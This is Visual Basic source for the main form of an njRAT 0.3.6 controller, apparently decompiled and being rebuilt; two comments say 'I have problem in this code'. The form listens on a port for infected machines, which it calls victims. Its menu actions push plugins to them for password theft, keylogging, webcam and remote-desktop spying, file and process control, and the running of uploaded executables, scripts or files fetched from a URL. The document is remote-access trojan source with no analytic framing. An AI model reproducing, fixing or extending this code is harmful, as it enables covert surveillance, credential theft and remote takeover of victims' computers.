Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT
Imports njRAT_0._3._6.njRAT.ind
Imports System.Windows.Forms.ListView

Public Class Form1

    Public CEL As Client
    Public Logs1 As Logs
    Public PMON As Boolean
    Public port As Integer
    Public S As SK
    Private x As Integer

    Public Sub New()
        Me.CEL = Nothing
        Dim logs As New Logs
        logs.Dock = DockStyle.Fill
        Me.Logs1 = logs
        Me.PMON = False
        Me.x = 1
        Me.InitializeComponent()
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & ind.Y & "!")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        Me.L1.View = System.Windows.Forms.View.Details
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisconnectToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateSetComplex(current.Tag, Nothing, "CN", New Object() {False}, Nothing, Nothing, False, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Interaction.MsgBox(exception.Message, MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim p As plg = ind.GETPLG("fm.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub FlagToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FlagToolStripMenuItem.Click
        Me.SmallToolStripMenuItem.Checked = False
        Me.MediumToolStripMenuItem.Checked = False
        Me.LargeToolStripMenuItem.Checked = False
        Me.SmallToolStripMenuItem.Checked = False
        Me.FlagToolStripMenuItem.Checked = True
        Dim smallImageList As ImageList = Me.L1.SmallImageList
        SyncLock smallImageList
            Me.L1.SmallImageList = Me.IMG2
            Me.L1.LargeImageList = Me.IMG2
            Dim items As ListViewItemCollection = Me.L1.Items
            SyncLock items
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.L1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        current.ImageKey = (current.SubItems.Item(ind.hco).Text & ".png")
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End SyncLock
        End SyncLock
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Control.CheckForIllegalCrossThreadCalls = False
        ind.F = Me
        Me.Text = ind.vr
        Me.Show()
        Me.Controls.Add(Me.Logs1)
        Dim str As String
        For Each str In Directory.GetFiles((Application.StartupPath & "\plugin\"), "*.dll")
            ind.Plug.Add(New plg(New FileInfo(str).Name.ToLower))
        Next
        Dim str2 As String
        For Each str2 In Strings.Split("cam.dll,ch.dll,fm.dll,proc.dll,pw.dll,sc.dll", ",", -1, CompareMethod.Binary)
            If (ind.GETPLG(str2, Nothing) Is Nothing) Then
                Interaction.MsgBox(("Missing dll >> " & str2), MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Next
        Do While True
            Try
                Dim str3 As String = Interaction.InputBox("..", "PORT", FN.GTV("port", "1177"), -1, -1)
                If (str3.Length = 0) Then
                    ProjectData.EndApp()
                End If
                Me.port = Conversions.ToInteger(str3)
                Me.S = New SK(Conversions.ToInteger(str3))
                FN.STV("port", str3)
                Exit Do
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError()
            End Try
        Loop
        ind.W = Me.S
        Me.Controls.Add(Me.Logs1)
        Me.Logs1.SendToBack()
        Me.L1.BringToFront()
        Me.Logs1.Timer1.Enabled = True
    End Sub

    Private Sub FromDISKToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDISKToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim dialog As New OpenFileDialog
            dialog.Filter = "EXE|*.exe"
            dialog.FileName = ""
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = FN.ZIP(File.ReadAllBytes(dialog.FileName), cM)
                Dim stream As New MemoryStream
                Dim s As String = ("up" & ind.Y)
                stream.Write(FN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim dz As New Thread(New ParameterizedThreadStart(AddressOf ind.SendTo), 1)
                dz.Start(New Object() {Me.L1.SelectedItems, stream.ToArray, Color.Green})
            End If
        End If
    End Sub

    Private Sub FromDISKToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromDISKToolStripMenuItem1.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim dialog As New OpenFileDialog
            dialog.FileName = ""
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = FN.ZIP(File.ReadAllBytes(dialog.FileName), cM)
                Dim stream As New MemoryStream
                Dim s As String = ("rn" & ind.Y & New FileInfo(dialog.FileName).Extension & ind.Y)
                stream.Write(FN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim dzd As New Thread(New ParameterizedThreadStart(AddressOf ind.SendTo), 1)
                dzd.Start(New Object() {Me.L1.SelectedItems, stream.ToArray, Color.Green})
            End If
        End If
    End Sub

    Private Sub FromLINKToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromLINKToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim str2 As String = ("up" & ind.Y)
            Dim str As String = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator
                str2 = (str2 & str)
                Try
                    enumerator = Me.L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str2}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str2 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Green
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub FromLINKToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromLINKToolStripMenuItem1.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim furl As New FURL
            furl.ShowDialog(Me)
            If furl.IsOK Then
                Dim enumerator As IEnumerator
                Dim str As String = String.Concat(New String() {"rn", ind.Y, furl.TextBox2.Text, ind.Y, furl.TextBox1.Text})
                Try
                    enumerator = Me.L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.GreenYellow
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim p As plg = ind.GETPLG("pw.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    ind.SendPlug(DirectCast(current.Tag, Client), p, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"kl"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub L1_DoubleClick(sender As Object, e As EventArgs) Handles L1.DoubleClick
        If (Me.L1.SelectedItems.Count > 0) Then
            DirectCast(Me.L1.SelectedItems.Item(0).Tag, Client).Send("inf")
        End If
    End Sub

    Private Sub L1_KeyDown(sender As Object, e As KeyEventArgs) Handles L1.KeyDown
        Select Case e.KeyCode
            Case Keys.A
                If My.Computer.Keyboard.CtrlKeyDown Then
                    Dim items As ListViewItemCollection = Me.L1.Items
                    SyncLock items
                        Dim enumerator As IEnumerator
                        Try
                            enumerator = Me.L1.Items.GetEnumerator
                            Do While enumerator.MoveNext
                                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                current.Selected = True
                            Loop
                            Exit Select
                        Finally
                            If TypeOf enumerator Is IDisposable Then
                                TryCast(enumerator, IDisposable).Dispose()
                            End If
                        End Try
                    End SyncLock
                End If
                Exit Select
            Case Keys.Space
                Me.L1.FX()
                Exit Select
        End Select
    End Sub
    ' I have problem in this code that's all
    Private Sub LargeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LargeToolStripMenuItem.Click
        Me.SmallToolStripMenuItem.Checked = False
        Me.MediumToolStripMenuItem.Checked = False
        Me.LargeToolStripMenuItem.Checked = True
        Me.DesktopToolStripMenuItem.Checked = True
        Me.FlagToolStripMenuItem.Checked = False
        Dim smallImageList As ImageList = Me.L1.SmallImageList
        SyncLock smallImageList
            Me.L1.SmallImageList = Me.IMG
            Me.L1.LargeImageList = Me.IMG
            Me.IMG.Images.Clear()
            Dim size As New Size(200, 160)
            Me.IMG.ImageSize = size
            Me.IMG.Images.Add("s", My.Resources.JPEG)
            Dim items As ListViewItemCollection = Me.L1.Items
            SyncLock items
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.L1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        current.ImageKey = "s"
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End SyncLock
        End SyncLock
    End Sub

    Private Sub ListToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListToolStripMenuItem.Click
        Me.L1.View = Windows.Forms.View.LargeIcon
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Me.SEL.Text = ("Sel[" & (Me.L1.SelectedItems.Count) & "]")
    End Sub
    ' I have problem in this code that's all
    Private Sub MediumToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MediumToolStripMenuItem.Click
        Me.SmallToolStripMenuItem.Checked = False
        Me.MediumToolStripMenuItem.Checked = True
        Me.LargeToolStripMenuItem.Checked = False
        Me.DesktopToolStripMenuItem.Checked = True
        Me.FlagToolStripMenuItem.Checked = False
        Dim smallImageList As ImageList = Me.L1.SmallImageList
        Me.L1.SmallImageList = Me.IMG
        Me.L1.LargeImageList = Me.IMG
        Me.IMG.Images.Clear()
        Dim size As New Size(160, 100)
        Me.IMG.ImageSize = size
        Me.IMG.Images.Add("s", My.Resources.JPEG)
        Dim items As ListViewItemCollection = Me.L1.Items
        SyncLock items
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.L1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = CType(enumerator.Current, ListViewItem)
                    current.ImageKey = "s"
                Loop
            Finally
            End Try
        End SyncLock
    End Sub

    Private Sub OpenChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenChatToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim p As plg = ind.GETPLG("ch.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim p As plg = ind.GETPLG("proc.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RemoteCamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteCamToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim p As plg = ind.GETPLG("cam.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim p As plg = ind.GETPLG("sc.dll", Nothing)
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim s As String = Interaction.InputBox("Enter New Name", "Rename Victim", "", -1, -1)
        If (s.Length > 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Try
                        NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {String.Concat(New String() {"prof", ind.Y, "~", ind.Y, "vn", ind.Y, FN.ENB(s)})}, Nothing, Nothing, Nothing, True)
                        current.Text = (s & "_" & Strings.Split(current.Text, "_", -1, CompareMethod.Binary)((Strings.Split(current.Text, "_", -1, CompareMethod.Binary).Length - 1)))
                        Continue Do
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        ProjectData.ClearProjectError()
                        Continue Do
                    End Try
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & ind.Y & "@")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ScriptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScriptToolStripMenuItem.Click
        If (Me.L1.SelectedItems.Count <> 0) Then
            Dim script As New script
            script.ShowDialog(Me)
            If (script.Code.Length > 0) Then
                Dim enumerator As IEnumerator
                Dim cM As Boolean = True
                Dim buffer As Byte() = FN.ZIP(FN.SB(script.Code), cM)
                Dim stream As New MemoryStream
                Dim s As String = ("rn" & ind.Y & script.RunAs & ind.Y)
                stream.Write(FN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Try
                    enumerator = Me.L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {stream.ToArray}, Nothing, Nothing, Nothing, True)
                            current.ForeColor = Color.Green
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub SmallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SmallToolStripMenuItem.Click
        Me.SmallToolStripMenuItem.Checked = True
        Me.MediumToolStripMenuItem.Checked = False
        Me.LargeToolStripMenuItem.Checked = False
        Me.DesktopToolStripMenuItem.Checked = True
        Me.FlagToolStripMenuItem.Checked = False
        Dim smallImageList As ImageList = Me.L1.SmallImageList
        SyncLock smallImageList
            Me.L1.SmallImageList = Me.IMG
            Me.L1.LargeImageList = Me.IMG
            Me.IMG.Images.Clear()
            Dim size As New Size(60, 40)
            Me.IMG.ImageSize = size
            Me.IMG.Images.Add("s", My.Resources.JPEG)
            Dim items As ListViewItemCollection = Me.L1.Items
            SyncLock items
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.L1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        current.ImageKey = "s"
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End SyncLock
        End SyncLock
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.Timer1.Enabled = False
        If ((Not Me.S Is Nothing) AndAlso (Me.S.Online.Count <> 0)) Then
            Dim smallImageList As ImageList = Me.L1.SmallImageList
            SyncLock smallImageList
                If (Me.IMG Is ind.F.L1.SmallImageList) Then
                    If (Me.S.Online.Count < Me.x) Then
                        Me.x = 1
                    End If
                    Dim client As Client = CType(Me.S.Online.Item(Me.x), Client)
                    If (Not client.Isend AndAlso Me.L1.Items.ContainsKey(client.ip)) Then
                        client.Isend = True
                        Dim thread2 As New Thread(New ParameterizedThreadStart(AddressOf lamm), 1)
                        thread2.Priority = ThreadPriority.Lowest
                        thread2.Start(FN.SB(String.Concat(New String() {"CAP", ind.Y, (Me.IMG.ImageSize.Width), ind.Y, (Me.IMG.ImageSize.Height)})))
                    End If
                    Me.x += 1
                End If
            End SyncLock
        End If
        Me.Timer1.Enabled = True
    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel1.Click
        Me.L1.BringToFront()
    End Sub

    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
        Me.Logs1.BringToFront()
        Me.StatusStrip1.SendToBack()
        Me.Logs1.Lgs.SelectionStart = Me.Logs1.Lgs.TextLength
    End Sub

    Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel3.Click
        Builder.ShowDialog()
    End Sub

    Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel4.Click
        About.ShowDialog()
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & ind.Y & "~")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub
    Public siva As Client
    Public Sub lamm(ByVal a0 As Object)
        Me.siva.SendNoWait(CType(a0, Byte()))
    End Sub
End Class
